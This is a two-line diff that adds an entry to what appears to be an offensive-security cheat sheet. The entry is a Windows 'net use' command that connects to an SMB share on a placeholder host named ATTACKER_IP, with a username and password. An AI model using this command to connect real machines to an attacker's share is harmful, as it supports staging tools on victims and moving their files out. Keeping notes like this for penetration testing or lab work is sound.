@@ -1,0 +1,2 @@
+- connect to smb share : 
+    - net use \\ATTACKER_IP\\SHARE_NAME /u:USERNAME PASSWORD
